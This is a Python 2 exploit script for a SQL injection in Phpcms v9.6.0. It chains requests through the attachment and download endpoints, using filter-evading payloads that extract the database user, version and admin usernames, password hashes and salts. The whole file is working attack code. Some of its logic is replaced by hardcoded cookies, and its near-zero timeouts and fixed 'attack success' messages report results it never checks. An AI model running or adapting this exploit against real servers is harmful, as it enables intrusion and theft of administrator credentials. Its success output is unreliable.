#   -*-coding:utf-8  -*-
#!usr/bin/env python2

import requests,sys,urllib

def attacker(host, port = 9998):
    # url = sys.argv[1]
    url = 'http://{}:{}'.format(host, port)
    print 'Phpcms v9.6.0 SQLi Exploit Code By Luan'
    sqli_prefix = '%*27an*d%20'
    sqli_info = 'e*xp(~(se*lect%*2af*rom(se*lect co*ncat(0x6c75616e24,us*er(),0x3a,ver*sion(),0x6c75616e24))x))'
    sqli_password1 = 'e*xp(~(se*lect%*2afro*m(sel*ect co*ncat(0x6c75616e24,username,0x3a,password,0x3a,encrypt,0x6c75616e24) fr*om '
    sqli_password2 = '_admin li*mit 0,1)x))'
    sqli_padding = '%23%26m%3D1%26f%3Dwobushou%26modelid%3D2%26catid%3D6'
    setp1 = url + '/index.php?m=wap&a=index&siteid=1'
    # cookies = {}
    cookies = {
                'YuHYi_siteid':'b6f99SIA76TTGvDeKXlSs_jlueSrQfGb7S0oJAE6oN'
    }


    # step 1 begin
    try:
        requests.get(setp1, timeout = 0.001)
    except Exception as e:
        print("set1 finish")

    """
    for c in requests.get(setp1).cookies:
    	if c.name[-7:] == '_siteid':
    		cookie_head = c.name[:6]
    		cookies[cookie_head+'_userid'] = c.value
    		cookies[c.name] = c.value
    		print '[+] Get Cookie : ' + str(cookies)

    """

    # step 2 begin

    setp2 = url + '/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=' + sqli_prefix + urllib.quote_plus(sqli_info, safe='qwertyuiopasdfghjklzxcvbnm*') + sqli_padding

    try:
        requests.get(setp2, cookies = cookies, timeout = 0.001)
    except Exception as e:
        print("setp2 has begin")

    cookies = {
        'YuHYi_att_json':"0706c-b6DpFAHXijtj0MdMpFk5HCPUTfpyE3him5ebMApcAhTgdzAkqTr1CNazEzrMgKGC79z4Kn-KYAlPfWyVI7I8S1w9KAuE1wERt4uo3JGt-teCrZLDSW2rSe40SowQBnZt-TenW34OdWtBwrRTuSQ0E86RbDpfuGoZjenK"
            }

    sqli_payload = "cdfeBN2VZhPoa33OD3qA13F6ZxHZhJFUZ1NKi7O1"
    """
    for c in requests.get(setp2,cookies=cookies).cookies:
    	if c.name[-9:] == '_att_json':
    		sqli_payload = c.value
    		print '[+] Get SQLi Payload : ' + sqli_payload
    """

    setp3 = url + '/index.php?m=content&c=down&a_k=' + sqli_payload

    try:
        html = requests.get(setp3,cookies=cookies, timeout=0.001)
    except Exception as e:
        print("setp3 has begin")

    print '[+] Get SQLi Output : '
    table_prefix = 'user'
    # table_prefix = html[html.find('_download_data')-2:html.find(	'_download_data')]
    # print '[+] Get Table Prefix : ' + table_prefix
    setp2 = url + '/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=' + sqli_prefix + urllib.quote_plus(sqli_password1, safe='qwertyuiopasdfghjklzxcvbnm*') + table_prefix + urllib.quote_plus(sqli_password2, safe='qwertyuiopasdfghjklzxcvbnm*') + sqli_padding

    try:
        requests.get(setp2, cookies=cookies, timeout=0.001)
    except Exception as e:
        print("setp2 twice has begin")

    """
    for c in requests.get(setp2,cookies=cookies).cookies:
    	if c.name[-9:] == '_att_json':
    		sqli_payload = c.value
    		print '[+] Get SQLi Payload : ' + sqli_payload
    """
    setp3 = url + '/index.php?m=content&c=down&a_k=' + sqli_payload
    # finally sql begin !

    try:
        requests.get(setp3,cookies=cookies, timeout=0.001)
    except Exception as e:
        print("finally attack success!")

    print '[+] Get SQLi Output : '
    return True


if __name__ == '__main__':
    attacker("127.0.0.1")
